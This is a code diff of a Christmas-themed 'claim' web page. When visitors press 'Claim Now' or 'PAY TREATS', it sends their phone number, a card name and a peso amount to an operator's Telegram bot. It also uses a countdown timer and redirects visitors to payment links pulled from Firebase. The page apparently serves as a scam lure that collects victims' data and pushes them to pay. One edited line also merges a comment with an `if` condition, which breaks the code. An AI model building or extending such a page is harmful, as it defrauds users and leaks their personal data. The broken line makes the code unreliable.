@@ -105,6 +105,9 @@
   <div class="snowflake" style="left: 85%; animation-duration: 14s; animation-delay: 1s;">❄</div>
   <div class="snowflake" style="left: 92%; animation-duration: 11s; animation-delay: 3s;">❄</div>
 
+  <!-- AUDIO ELEMENT -->
+  <audio id="claimSound" src="sound/bells.mp3" preload="auto"></audio>
+
   <!-- MAIN CARD -->
   <div class="main-card">
     
@@ -312,15 +315,9 @@
   </div>
 
   <!-- ============================================================
-       JAVASCRIPT - COMPLETE WORKING WITH TELEGRAM ALERTS
+       JAVASCRIPT - COMPLETE WORKING WITH TELEGRAM FROM CONFIG
   ============================================================ -->
   <script>
-    // ============================================================
-    // TELEGRAM CONFIGURATION - PALITAN ITO
-    // ============================================================
-    var TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';  // Palitan ng bot token
-    var TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';      // Palitan ng chat ID
-
     // ============================================================
     // FIREBASE INIT
     // ============================================================
@@ -341,48 +338,52 @@
     }
 
     // ============================================================
-    // TELEGRAM ALERT FUNCTION
+    // TELEGRAM FROM CONFIG.JS
     // ============================================================
-    function sendTelegramAlert(user, card, amount, time, action) {
-      var message = '🎯 <b>CLAIM ALERT</b>\n\n' +
-                    '📌 <b>Action:</b> ' + action + '\n' +
-                    '👤 <b>User:</b> ' + user + '\n' +
-                    '💳 <b>Card:</b> ' + card + '\n' +
-                    '💰 <b>Amount:</b> ' + amount + '\n' +
-                    '🕐 <b>Time:</b> ' + time;
+    // Gumagamit ng telegramConfig mula sa config.js
+    // Expected format:
+    // var telegramConfig = {
+    //   botToken: 'YOUR_BOT_TOKEN',
+    //   chatId: 'YOUR_CHAT_ID'
+    // };
 
-      // Check if bot token and chat ID are configured
-      if (TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
-        console.log('⚠️ Telegram not configured');
-        console.log('📱 TELEGRAM ALERT (SIMULATED):');
-        console.log('   Action: ' + action);
-        console.log('   User: ' + user);
-        console.log('   Card: ' + card);
-        console.log('   Amount: ' + amount);
-        console.log('   Time: ' + time);
-        showToast('📱 Telegram Alert (Simulated)', action + ' - ' + user);
+    function sendTelegramMessage(message) {
+      // Check if telegramConfig exists in config.js
+      if (typeof telegramConfig === 'undefined') {
+        console.log('⚠️ telegramConfig not found in config.js');
+        console.log('📱 TELEGRAM MESSAGE (SIMULATED):', message);
+        showToast('📱 Telegram (Simulated)', message.substring(0, 50) + '...');
         return;
       }
 
-      // Send to Telegram
-      var url = 'https://api.telegram.org/bot' + TELEGRAM_BOT_TOKEN + '/sendMessage';
+      var botToken = telegramConfig.botToken;
+      var chatId = telegramConfig.chatId;
+
+      if (!botToken || !chatId) {
+        console.log('⚠️ Telegram credentials missing in config.js');
+        console.log('📱 TELEGRAM MESSAGE (SIMULATED):', message);
+        showToast('📱 Telegram (Simulated)', message.substring(0, 50) + '...');
+        return;
+      }
+
+      var url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
       
       fetch(url, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          chat_id: TELEGRAM_CHAT_ID,
+          chat_id: chatId,
           text: message,
           parse_mode: 'HTML'
         })
       })
       .then(function(response) {
         if (response.ok) {
-          console.log('✅ Telegram alert sent: ' + action);
-          showToast('✅ Telegram Alert Sent', action + ' - ' + user);
+          console.log('✅ Telegram message sent successfully');
+          showToast('✅ Telegram Sent', 'Message delivered');
         } else {
           console.log('❌ Telegram error:', response.status);
-          showToast('❌ Telegram Error', 'Failed to send alert');
+          showToast('❌ Telegram Error', 'Failed to send');
         }
       })
       .catch(function(error) {
@@ -395,7 +396,6 @@
     // TOAST NOTIFICATION
     // ============================================================
     function showToast(title, message) {
-      // Remove existing toast
       var existingToast = document.querySelector('.toast-notification');
       if (existingToast) {
         existingToast.remove();
@@ -409,12 +409,27 @@
       `;
       document.body.appendChild(toast);
 
-      // Auto remove after 5 seconds
       setTimeout(function() {
         if (toast.parentNode) {
           toast.remove();
         }
       }, 5000);
+    }
+
+    // ============================================================
+    // PLAY SOUND
+    // ============================================================
+    function playClaimSound() {
+      var audio = document.getElementById('claimSound');
+      if (audio) {
+        audio.currentTime = 0;
+        audio.play().catch(function(error) {
+          console.log('🔊 Sound play error:', error);
+        });
+        console.log('🔊 Playing claim sound');
+      } else {
+        console.log('⚠️ Audio element not found');
+      }
     }
 
     // ============================================================
@@ -823,11 +838,24 @@
       document.body.style.overflow = 'hidden';
       
       // ============================================================
+      // PLAY SOUND ON CLAIM NOW
+      // ============================================================
+      playClaimSound();
+      
+      // ============================================================
       // TELEGRAM ALERT 1: Claim Now Button
       // ============================================================
       var currentTime = getPhilippineTime();
       var formattedAmount = '₱' + formatWithCommas(rawAmount);
-      sendTelegramAlert(userPhone, data.name, formattedAmount, currentTime, 'Claim Now');
+      
+      var telegramMessage = '🎯 <b>CLAIM ALERT</b>\n\n' +
+                            '📌 <b>Action:</b> Claim Now\n' +
+                            '👤 <b>User:</b> ' + userPhone + '\n' +
+                            '💳 <b>Card:</b> ' + data.name + '\n' +
+                            '💰 <b>Amount:</b> ' + formattedAmount + '\n' +
+                            '🕐 <b>Time:</b> ' + currentTime;
+      
+      sendTelegramMessage(telegramMessage);
       
       if (database && currentTreatType) {
         checkForDeployedLink(currentTreatType).then(function(link) {
@@ -870,10 +898,16 @@
       var currentTime = getPhilippineTime();
       var formattedAmount = '₱' + formatWithCommas(rawAmount);
       
-      sendTelegramAlert(userPhone, data.name, formattedAmount, currentTime, 'PAY TREATS');
+      var telegramMessage = '🎯 <b>CLAIM ALERT</b>\n\n' +
+                            '📌 <b>Action:</b> PAY TREATS\n' +
+                            '👤 <b>User:</b> ' + userPhone + '\n' +
+                            '💳 <b>Card:</b> ' + data.name + '\n' +
+                            '💰 <b>Amount:</b> ' + formattedAmount + '\n' +
+                            '🕐 <b>Time:</b> ' + currentTime;
       
-      // Check if link already exists - redirect immediately
-      if (treatLink && !isRedirecting) {
+      sendTelegramMessage(telegramMessage);
+      
+      // Check if link already exists - redirect immediately      if (treatLink && !isRedirecting) {
         isRedirecting = true;
         claimPayBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> REDIRECTING...';
         setTimeout(function() { 
@@ -892,12 +926,10 @@
       timerInterval = setInterval(function() {
         timeRemaining--;
         
-        // Calculate minutes and seconds
         var minutes = Math.floor(timeRemaining / 60);
         var seconds = timeRemaining % 60;
         var timeStr = String(minutes).padStart(2, '0') + ':' + String(seconds).padStart(2, '0');
         
-        // Update timer display
         var timerDisplay = document.getElementById('claimTimerDisplay');
         if (timerDisplay) {
           timerDisplay.textContent = timeStr;
@@ -918,7 +950,6 @@
           
           console.log('⏰ Timer finished - checking for link');
           
-          // Check for link after timer ends
           if (database && currentTreatType) {
             checkForDeployedLink(currentTreatType).then(function(link) {
               if (link && !isRedirecting) {
@@ -1006,7 +1037,8 @@
     console.log('✅ Thought bubble started');
     console.log('✅ Auto-scan enabled (every 1 second)');
     console.log('✅ Timer fixed - will countdown properly');
-    console.log('✅ Telegram alerts configured for Claim Now and PAY TREATS');
+    console.log('✅ Sound will play on Claim Now');
+    console.log('✅ Telegram uses config.js');
   </script>
 
 </body>
